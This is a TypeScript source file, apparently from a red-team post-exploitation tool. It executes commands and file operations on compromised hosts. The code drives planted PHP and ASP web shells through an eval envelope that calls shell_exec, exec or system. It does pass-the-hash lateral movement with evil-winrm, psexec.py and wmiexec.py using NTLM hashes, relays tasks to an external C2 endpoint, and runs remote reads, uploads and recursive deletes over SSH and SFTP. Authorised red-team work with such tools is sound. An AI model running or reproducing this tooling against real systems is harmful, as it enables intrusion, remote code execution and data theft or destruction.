import http from 'node:http'
import https from 'node:https'
import { createReadStream, createWriteStream, readFileSync, renameSync, statSync } from 'node:fs'
import { basename as pathModuleBasename, join as pathModuleJoin } from 'node:path'
import { createHash } from 'node:crypto'
import { pipeline } from 'node:stream/promises'
import { Client, type ConnectConfig, type SFTPWrapper } from 'ssh2'
import { runProcess } from './shell.ts'
import { ExecutionError, commandFrame, executionResult, parseCommandFrame, quoteShell, validateExecutionResult, type ExecutionResult } from './execution-result.ts'

export async function request(url: string, options: { method?: string; headers?: Record<string, string>; data?: string; verifyTls?: boolean; timeout?: number; signal?: AbortSignal } = {}) {
  return new Promise<{ data: Buffer; headers: http.IncomingHttpHeaders; status: number }>((resolve, reject) => {
    const address = new URL(url), call = (address.protocol === 'https:' ? https : http).request(address, { method: options.method ?? 'GET', headers: options.headers, rejectUnauthorized: options.verifyTls !== false, signal: options.signal }, response => {
      const chunks: Buffer[] = []; let size = 0
      response.on('data', chunk => { size += chunk.length; if (size > 64 * 1024 * 1024) response.destroy(new ExecutionError('PROTOCOL_ERROR', 'Response exceeds 64 MiB')); else chunks.push(chunk) })
      response.on('error', reject)
      response.on('end', () => { const data = Buffer.concat(chunks); if ((response.statusCode ?? 500) >= 400) reject(new ExecutionError('TRANSPORT_ERROR', `HTTP ${response.statusCode}: ${data.toString().slice(0, 1000)}`, data.toString())); else resolve({ data, headers: response.headers, status: response.statusCode ?? 200 }) })
    })
    call.setTimeout((options.timeout ?? 60) * 1000, () => call.destroy(new ExecutionError('TIMEOUT', 'Request timed out')))
    call.on('error', reject); call.end(options.data)
  })
}

export function operationCommand(action: string, args: Record<string, any>, metadata: Record<string, any>) {
  const windows = (metadata.os ?? (['asp', 'aspx'].includes(metadata.shell_type) ? 'windows' : 'linux')) === 'windows'
  if (action === 'command') { if (!args.command?.trim()) throw new ExecutionError('PROTOCOL_ERROR', 'command is required'); return args.command as string }
  if (action === 'probe') return windows ? `echo RT_${crypto.randomUUID().replaceAll('-', '')}` : `printf %s RT_${crypto.randomUUID().replaceAll('-', '')}`
  if (action === 'probe_info') return windows
    ? `$o=[ordered]@{version=1;os=[Environment]::OSVersion.Platform.ToString();arch=$env:PROCESSOR_ARCHITECTURE;user=[Environment]::UserName;cwd=(Get-Location).Path;hostname=[Environment]::MachineName};$o|ConvertTo-Json -Compress`
    : `printf 'version=1\\nos=%s\\narch=%s\\nuser=%s\\ncwd=%s\\nhostname=%s\\n' "$(uname -s)" "$(uname -m)" "$(id -un)" "$PWD" "$(hostname)"`
  if (!args.path?.trim()) throw new ExecutionError('PROTOCOL_ERROR', 'path is required')
  const quote = (s: string) => "'" + s.replaceAll("'", windows ? "''" : "'\"'\"'") + "'", p = quote(args.path)
  if (action === 'write_file' && (typeof args.content_base64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(args.content_base64))) throw new ExecutionError('PROTOCOL_ERROR', 'content_base64 is required')
  if (action === 'move_file' && !args.destination?.trim()) throw new ExecutionError('PROTOCOL_ERROR', 'destination is required')
  const commands: Record<string, string> = windows ? {
    list_files: `Get-ChildItem -Force -LiteralPath ${p} | ForEach-Object { $kind=if($_.PSIsContainer){'d'}else{'f'}; $size=if($_.PSIsContainer){0}else{$_.Length}; Write-Output ($kind+[char]9+$_.Name+[char]9+$_.LastWriteTime.ToString('o')+[char]9+$size+[char]9+$_.Mode) }`,
    read_file: `[Convert]::ToBase64String([IO.File]::ReadAllBytes(${p}))`, write_file: `$b=[Convert]::FromBase64String('${args.content_base64 ?? ''}');$f=[IO.File]::Open(${p},'${args.overwrite === true ? 'Create' : 'CreateNew'}');try{$f.Write($b,0,$b.Length)}finally{$f.Dispose()}`,
    stat_file: `$i=Get-Item -Force -LiteralPath ${p};[pscustomobject]@{path=$i.FullName;size=if($i.PSIsContainer){0}else{$i.Length};directory=$i.PSIsContainer;mtime=$i.LastWriteTimeUtc.ToString('o')}|ConvertTo-Json -Compress`,
    hash_file: `(Get-FileHash -Algorithm SHA256 -LiteralPath ${p}).Hash.ToLowerInvariant()`,
    create_directory: `[IO.Directory]::CreateDirectory(${p}) | Out-Null`, create_file: `[IO.File]::Open(${p},'CreateNew').Dispose()`,
    move_file: `Move-Item ${args.overwrite === true ? '-Force ' : ''}-LiteralPath ${p} -Destination ${quote(args.destination ?? '')}`, delete_file: `Remove-Item -Recurse -Force -LiteralPath ${p}`,
  } : {
    list_files: `find ${p} -mindepth 1 -maxdepth 1 -printf '%y\t%f\t%TY-%Tm-%TdT%TH:%TM:%TS%Tz\t%s\t%m\n'`, read_file: `base64 -- ${p}`, write_file: `(${args.overwrite === true ? '' : 'set -C; '}printf %s ${quote(args.content_base64 ?? '')} | base64 -d > ${p})`,
    stat_file: `stat -c '{"size":%s,"type":"%F","mtime_epoch":%Y}' -- ${p}`, hash_file: `sha256sum -- ${p} | cut -d' ' -f1`,
    create_directory: `mkdir -p -- ${p}`, create_file: `(set -C; : > ${p})`, move_file: `mv ${args.overwrite === true ? '' : '-n ' }-- ${p} ${quote(args.destination ?? '')} && test ! -e ${p}`, delete_file: `rm -rf -- ${p}`,
  }
  if (!commands[action]) throw new ExecutionError('CAPABILITY_UNSUPPORTED', `Unsupported action: ${action}`)
  return windows ? `powershell -NoProfile -NonInteractive -EncodedCommand ${Buffer.from(commands[action], 'utf16le').toString('base64')}` : commands[action]
}

export async function executeWebshell(url: string, metadata: Record<string, any>, secret: Record<string, any>, action: string, args: Record<string, any>, signal?: AbortSignal): Promise<ExecutionResult> {
  const original = operationCommand(action, args, metadata), password = secret.password ?? '', key = metadata.command_param || password || 'cmd'
  const os = (metadata.os ?? (['asp', 'aspx'].includes(metadata.shell_type) ? 'windows' : 'linux')) === 'windows' ? 'windows' : 'linux'
  const framed = commandFrame(original, os, args.cwd), phpEnvelope = metadata.shell_type === 'php' && ['auto', 'eval', 'antsword'].includes(metadata.protocol ?? 'eval')
  let wire = framed.command, markers: string[] | undefined
  if (phpEnvelope) {
    const marker = crypto.randomUUID().replaceAll('-', ''); markers = [`RTPHPBEGIN${marker}`, `RTPHPEND${marker}`]
    wire = `@set_time_limit(0);@ini_set('display_errors','0');$c=base64_decode('${Buffer.from(framed.command).toString('base64')}');$o='';if(function_exists('shell_exec')){$o=@shell_exec('('.$c.') 2>&1');}elseif(function_exists('exec')){$a=array();@exec('('.$c.') 2>&1',$a);$o=implode("\\n",$a);}else{ob_start();@system('('.$c.') 2>&1');$o=ob_get_clean();}echo '${markers[0]}'.base64_encode((string)$o).'${markers[1]}';`
  }
  const payload = new URLSearchParams({ [key]: wire }); if (metadata.password_param && password) payload.set(metadata.password_param, password)
  const method = (metadata.method ?? 'POST').toUpperCase(), address = new URL(url)
  if (method === 'GET') for (const [name, value] of payload) address.searchParams.set(name, value)
  const response = await request(address.href, { method, headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...metadata.headers }, data: method === 'GET' ? undefined : payload.toString(), verifyTls: metadata.verify_tls, timeout: Math.max(1, Math.min(300, Number(args.timeout ?? metadata.timeout ?? 20))), signal })
  const encoding = !metadata.encoding || metadata.encoding === 'auto' ? /charset=([^;]+)/i.exec(String(response.headers['content-type']))?.[1] ?? 'utf-8' : metadata.encoding
  const decode = (buffer: Uint8Array) => new TextDecoder(encoding).decode(buffer)
  let output = decode(response.data)
  if (markers) {
    const start = output.indexOf(markers[0]), end = output.indexOf(markers[1], start + markers[0].length)
    if (start < 0 || end <= start) throw new ExecutionError('PROTOCOL_ERROR', 'WebShell response omitted the correlated result frame', output)
    const payload = output.slice(start + markers[0].length, end).trim()
    if (!/^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/.test(payload)) throw new ExecutionError('PROTOCOL_ERROR', 'WebShell result frame is not valid base64', output)
    output = decode(Buffer.from(payload, 'base64'))
  }
  const result = parseCommandFrame(output, framed)
  if (!result) {
    if ((metadata.protocol ?? 'raw') !== 'raw') throw new ExecutionError('PROTOCOL_ERROR', 'WebShell response omitted the command completion frame', output)
    return executionResult(output, null, { completion: 'unknown', error_code: 'UNKNOWN_RESULT', execution_context: { resource_type: 'webshell', target: url, cwd: args.cwd ?? null } })
  }
  result.execution_context = { resource_type: 'webshell', target: url, cwd: args.cwd ?? null }
  return result
}

function sshConfig(resource: any, metadata: any, secret: any): ConnectConfig {
  const privateKey = secret.private_key_path ? readFileSync(secret.private_key_path) : secret.private_key
  return { host: resource.target, port: Number(metadata.port ?? 22), username: secret.username || metadata.username || process.env.USER || '', password: secret.password || secret.value, privateKey,
    readyTimeout: Math.max(1000, Number(metadata.connect_timeout ?? 20) * 1000), hostHash: 'sha256', hostVerifier: metadata.host_fingerprint ? (hash: string) => hash === metadata.host_fingerprint : undefined }
}
async function withSsh<T>(resource: any, metadata: any, secret: any, signal: AbortSignal, run: (client: Client) => Promise<T>, seconds: number, partial: () => string): Promise<T> {
  return await new Promise<T>((resolve, reject) => {
    const client = new Client(); let settled = false
    const done = (error?: unknown, value?: T) => { if (settled) return; settled = true; clearTimeout(timer); signal.removeEventListener('abort', abort); client.end(); error ? reject(error) : resolve(value!) }
    const abort = () => done(new ExecutionError('CANCELLED', 'SSH operation cancelled; external side effects may have occurred', partial()))
    const timer = setTimeout(() => done(new ExecutionError('TIMEOUT', 'SSH operation timed out; execution result unknown', partial())), Math.max(1, Math.min(300, seconds)) * 1000)
    signal.addEventListener('abort', abort, { once: true })
    client.once('ready', () => void run(client).then(value => done(undefined, value), done))
    client.once('error', error => done(new ExecutionError(/auth/i.test(error.message) ? 'AUTH_FAILED' : 'TRANSPORT_ERROR', error.message, partial())))
    client.once('close', () => done(new ExecutionError('TRANSPORT_ERROR', 'SSH connection closed before a result', partial())))
    if (signal.aborted) abort()
    else try { client.connect(sshConfig(resource, metadata, secret)) } catch (error) { done(error) }
  })
}
async function sftpCall<T>(client: Client, run: (sftp: SFTPWrapper) => Promise<T>): Promise<T> {
  return await new Promise((resolve, reject) => client.sftp((error, sftp) => error ? reject(error) : void run(sftp).then(resolve, reject)))
}
const sftpBuffer = (sftp: SFTPWrapper, path: string) => new Promise<Buffer>((resolve, reject) => { const chunks: Buffer[] = []; let size = 0; const stream = sftp.createReadStream(path); stream.on('data', (chunk: Buffer) => { size += chunk.length; if (size > 2 * 1024 * 1024) stream.destroy(new ExecutionError('PROTOCOL_ERROR', 'SFTP read exceeds the 2 MiB bounded read limit')); else chunks.push(chunk) }); stream.on('error', reject); stream.on('end', () => resolve(Buffer.concat(chunks))) })
const sftpWrite = (sftp: SFTPWrapper, path: string, data: Buffer, overwrite = false) => new Promise<void>((resolve, reject) => { const stream = sftp.createWriteStream(path, { flags: overwrite ? 'w' : 'wx' }); stream.on('error', reject); stream.on('close', resolve); stream.end(data) })
const sftpStat = (sftp: SFTPWrapper, file: string) => new Promise<any | null>((resolve, reject) => sftp.stat(file, (error, stats) => error ? ((error as any).code === 2 ? resolve(null) : reject(error)) : resolve(stats)))
const sftpRename = (sftp: SFTPWrapper, source: string, destination: string, overwrite: boolean) => new Promise<void>((resolve, reject) => {
  const done = (error?: Error | null) => error ? reject(error) : resolve()
  if (overwrite && typeof (sftp as any).ext_openssh_rename === 'function') (sftp as any).ext_openssh_rename(source, destination, done)
  else sftp.rename(source, destination, done)
})
async function hashStream(stream: NodeJS.ReadableStream) { const hash = createHash('sha256'); for await (const chunk of stream as any) hash.update(chunk); return hash.digest('hex') }
const localHash = (file: string, bytes?: number) => bytes === 0 ? Promise.resolve(createHash('sha256').digest('hex')) : hashStream(createReadStream(file, bytes === undefined ? {} : { start: 0, end: bytes - 1 }))
const remoteHash = (sftp: SFTPWrapper, file: string, bytes?: number) => bytes === 0 ? Promise.resolve(createHash('sha256').digest('hex')) : hashStream(sftp.createReadStream(file, bytes === undefined ? {} : { start: 0, end: bytes - 1 }))
async function executeSsh(resource: any, metadata: any, secret: any, action: string, args: any, signal: AbortSignal): Promise<ExecutionResult> {
  const started_at = new Date().toISOString()
  let partialOutput = ''
  return withSsh(resource, metadata, secret, signal, async client => {
    if (['command', 'probe', 'probe_info'].includes(action)) {
      const commandResult = await new Promise<ExecutionResult>((resolve, reject) => {
      const command = action === 'command' ? String(args.command ?? '') : operationCommand(action, args, metadata)
      if (!command.trim()) return reject(new ExecutionError('PROTOCOL_ERROR', 'command is required'))
      const remote = args.cwd ? `cd -- ${quoteShell(String(args.cwd))} && ${command}` : command
      client.exec(remote, (error, stream) => {
        if (error) return reject(error); const stdout: Buffer[] = [], stderr: Buffer[] = []
        let size = 0
        const collect = (chunks: Buffer[], value: Buffer) => { size += value.length; if (size > 2 * 1024 * 1024) { stream.close(); reject(new ExecutionError('PROTOCOL_ERROR', 'SSH output exceeds 2 MiB', partialOutput, { truncated: true })); return }; chunks.push(Buffer.from(value)); partialOutput += value.toString() }
        stream.on('data', (value: Buffer) => collect(stdout, value)); stream.stderr.on('data', (value: Buffer) => collect(stderr, value)); stream.once('error', reject)
        stream.on('close', (code: number | undefined, signalName: string | undefined) => { const out = Buffer.concat(stdout).toString(), err = Buffer.concat(stderr).toString(); resolve(executionResult(out + err, code ?? null, { stdout: out, stderr: err, started_at, execution_context: { resource_id: resource.id, target: resource.target, user: secret.username || metadata.username || null, cwd: args.cwd ?? null, signal: signalName ?? null } })) })
      })
      })
      if (action === 'probe_info' && commandResult.exit_code === 0) {
        try {
          await sftpCall(client, sftp => new Promise<void>((resolve, reject) => sftp.realpath('.', error => error ? reject(error) : resolve())))
          commandResult.execution_context.file_protocol = 'sftp'
        } catch (error) { commandResult.execution_context.sftp_probe_error = error instanceof Error ? error.message : String(error) }
      }
      return commandResult
    }
    return await sftpCall(client, async sftp => {
      if (!['upload_file', 'download_file'].includes(action)) operationCommand(action, args, metadata) // Validate before any mutation.
      if (!args.path?.trim()) throw new ExecutionError('PROTOCOL_ERROR', 'path is required')
      if (action === 'upload_file' && !args._source_path) throw new ExecutionError('PROTOCOL_ERROR', 'Managed upload source is required')
      if (action === 'download_file' && !args._artifact_directory) throw new ExecutionError('PROTOCOL_ERROR', 'Controlled artifact directory is required')
      const path = String(args.path), result = (value = '') => executionResult(value, 0, { stdout: value, execution_context: { resource_id: resource.id, target: resource.target, protocol: 'sftp' }, started_at })
      if (action === 'read_file') return result((await sftpBuffer(sftp, path)).toString('base64'))
      if (action === 'write_file') { await sftpWrite(sftp, path, Buffer.from(String(args.content_base64 ?? ''), 'base64'), args.overwrite === true); return result() }
      if (action === 'upload_file') {
        const source = String(args._source_path ?? ''), sourceStats = statSync(source)
        if (!sourceStats.isFile()) throw new ExecutionError('PROTOCOL_ERROR', 'Managed upload source is not a file')
        const sourceHash = await localHash(source), temporary = `${path}.redtrace-${sourceHash.slice(0, 16)}.part`, target = await sftpStat(sftp, path)
        if (target && args.overwrite !== true) throw new ExecutionError('COMMAND_FAILED', 'Remote destination already exists')
        let partial = await sftpStat(sftp, temporary), offset = Number(partial?.size ?? 0)
        if (offset > sourceStats.size || offset > 0 && await localHash(source, offset) !== await remoteHash(sftp, temporary, offset)) {
          if (partial) await new Promise<void>((resolve, reject) => sftp.unlink(temporary, error => error ? reject(error) : resolve()))
          partial = null; offset = 0
        }
        if (offset < sourceStats.size) await pipeline(createReadStream(source, { start: offset }), sftp.createWriteStream(temporary, { flags: offset ? 'r+' : 'w', start: offset }))
        const uploaded = await sftpStat(sftp, temporary), uploadedHash = await remoteHash(sftp, temporary)
        if (uploaded?.size !== sourceStats.size || uploadedHash !== sourceHash) throw new ExecutionError('PROTOCOL_ERROR', 'Uploaded temporary file failed size or SHA-256 verification')
        if (target && args.overwrite === true && typeof (sftp as any).ext_openssh_rename !== 'function') throw new ExecutionError('CAPABILITY_UNSUPPORTED', 'Atomic overwrite requires OpenSSH posix-rename support')
        await sftpRename(sftp, temporary, path, !!target)
        return result(JSON.stringify({ path, size: sourceStats.size, sha256: sourceHash, resumed_from: offset, verified: true }))
      }
      if (action === 'download_file') {
        const temporary = pathModuleJoin(args._artifact_directory, 'download.part'), artifact = pathModuleJoin(args._artifact_directory, 'artifact.bin')
        await pipeline(sftp.createReadStream(path), createWriteStream(temporary, { flags: 'wx' }))
        const downloaded = statSync(temporary), sha256 = await localHash(temporary); renameSync(temporary, artifact)
        return executionResult(JSON.stringify({ path, size: downloaded.size, sha256, verified: true }), 0, { stdout: '', execution_context: { resource_id: resource.id, target: resource.target, protocol: 'sftp', artifact_path: artifact, artifact_name: pathModuleBasename(path), size_bytes: downloaded.size, sha256 }, started_at })
      }
      if (action === 'stat_file') return await new Promise<ExecutionResult>((resolve, reject) => sftp.stat(path, (error, stats) => error ? reject(error) : resolve(result(JSON.stringify({ path, size: stats.size, directory: stats.isDirectory(), mtime: new Date(stats.mtime * 1000).toISOString() })))))
      if (action === 'hash_file') return result(await remoteHash(sftp, path))
      if (action === 'list_files') return await new Promise<ExecutionResult>((resolve, reject) => sftp.readdir(path, (error, list) => error ? reject(error) : resolve(result(JSON.stringify(list.map((item: any) => ({ name: item.filename, size: item.attrs.size, directory: item.attrs.isDirectory(), mtime: new Date(item.attrs.mtime * 1000).toISOString() })))))))
      if (action === 'create_directory') return await new Promise<ExecutionResult>((resolve, reject) => sftp.mkdir(path, error => error ? reject(error) : resolve(result())))
      if (action === 'create_file') { await sftpWrite(sftp, path, Buffer.alloc(0)); return result() }
      if (action === 'move_file') return await new Promise<ExecutionResult>((resolve, reject) => sftp.rename(path, String(args.destination), error => error ? reject(error) : resolve(result())))
      if (action === 'delete_file') return await new Promise<ExecutionResult>((resolve, reject) => sftp.unlink(path, error => error ? reject(error) : resolve(result())))
      throw new ExecutionError('CAPABILITY_UNSUPPORTED', `SSH/SFTP does not support ${action}`)
    })
  }, Number(args.timeout ?? 60), () => partialOutput)
}

export function operationSupported(resource: any, action: string) {
  const metadata = JSON.parse(resource.metadata_json ?? '{}')
  if (['command', 'probe', 'probe_info'].includes(action)) return resource.kind !== 'entry' || action === 'command'
  const files = ['read_file', 'write_file', 'list_files', 'create_directory', 'create_file', 'move_file', 'delete_file', 'stat_file', 'hash_file', 'upload_file', 'download_file']
  if (!files.includes(action)) return false
  if (['upload_file', 'download_file'].includes(action)) return metadata.connection_type === 'direct' && metadata.shell_type === 'ssh'
  return resource.kind === 'webshell' || metadata.connection_type === 'direct' && metadata.shell_type === 'ssh'
    || metadata.connection_type === 'external_c2' && (metadata.supported_actions ?? []).includes(action)
}

export async function executeOperation(resource: any, task: any, cwd: string, signal: AbortSignal): Promise<ExecutionResult> {
  const metadata = JSON.parse(resource.metadata_json), secret = JSON.parse(resource.secret_json), args = JSON.parse(task.input_json), type = metadata.shell_type ?? 'custom'
  if (resource.kind === 'webshell') return executeWebshell(resource.target, metadata, secret, task.action, args, signal)
  if (resource.kind === 'entry') {
    if (task.action !== 'command') throw new ExecutionError('CAPABILITY_UNSUPPORTED', 'Verified entry supports remote.command only')
    const template = String(metadata.body_template ?? '{{command}}'), command = String(args.command ?? ''), encoded = metadata.command_encoding === 'base64' ? Buffer.from(command).toString('base64') : metadata.command_encoding === 'url' ? encodeURIComponent(command) : command
    const endpoint = String(metadata.url ?? resource.target), body = template.replaceAll('{{command}}', encoded), response = await request(endpoint, { method: metadata.method ?? 'POST', headers: metadata.headers ?? {}, data: body, verifyTls: metadata.verify_tls, timeout: Number(args.timeout ?? 60), signal })
    const output = response.data.toString(metadata.encoding ?? 'utf8'); return executionResult(output, null, { completion: 'unknown', error_code: 'UNKNOWN_RESULT', execution_context: { resource_id: resource.id, target: endpoint, entry: true } })
  }
  if (type === 'ssh') return executeSsh(resource, metadata, secret, task.action, args, signal)
  const timeout = Math.max(1, Math.min(300, Number(args.timeout ?? 60)))
  if (metadata.connection_type === 'external_c2') {
    const endpoint = secret.endpoint || metadata.endpoint; if (!endpoint) throw new ExecutionError('PROTOCOL_ERROR', 'External C2 adapter endpoint is required')
    const response = await request(endpoint, { method: 'POST', data: JSON.stringify({ version: 1, framework: metadata.framework || type, session_id: metadata.external_session_id || resource.target, action: task.action, arguments: args, attempt_id: task.attempt_id }), headers: { Accept: 'application/json, text/plain', 'Content-Type': 'application/json', ...(secret.token ? { Authorization: `Bearer ${secret.token}` } : {}) }, timeout, signal })
    try { return validateExecutionResult(JSON.parse(response.data.toString())) } catch { throw new ExecutionError('PROTOCOL_ERROR', 'External C2 adapter returned an invalid versioned result', response.data.toString()) }
  }
  const command = operationCommand(task.action, args, metadata), username = secret.username || metadata.username || '', password = secret.password || secret.value || '', hash = secret.hash || secret.ntlm_hash || '', domain = secret.domain || metadata.domain || ''
  let executable: string, argv: string[], input: string | undefined, env: Record<string, string> = {}
  if (type === 'evil_winrm') { executable = metadata.executable || 'evil-winrm'; argv = ['-i', resource.target, '-u', username, ...(password ? ['-p', password] : hash ? ['-H', hash] : [])]; input = `${command}\nexit\n` }
  else if (['psexec', 'wmi'].includes(type)) { executable = metadata.executable || (type === 'psexec' ? 'psexec.py' : 'wmiexec.py'); const principal = domain ? `${domain}/${username}` : username; argv = [...(hash ? ['-hashes', hash] : []), `${principal}${password ? ':' + password : ''}@${resource.target}`, command] }
  else { executable = metadata.executable || type; argv = [...(metadata.arguments ?? []).map(String), resource.target, command] }
  const result = await runProcess(executable, argv, cwd, { signal, timeout, input, env })
  return executionResult(result.text, null, { completion: 'unknown', error_code: result.exitCode === 0 ? 'UNKNOWN_RESULT' : 'TRANSPORT_ERROR', output_ref: result.outputPath, execution_context: { resource_id: resource.id, target: resource.target, client: type, client_exit_code: result.exitCode } })
}
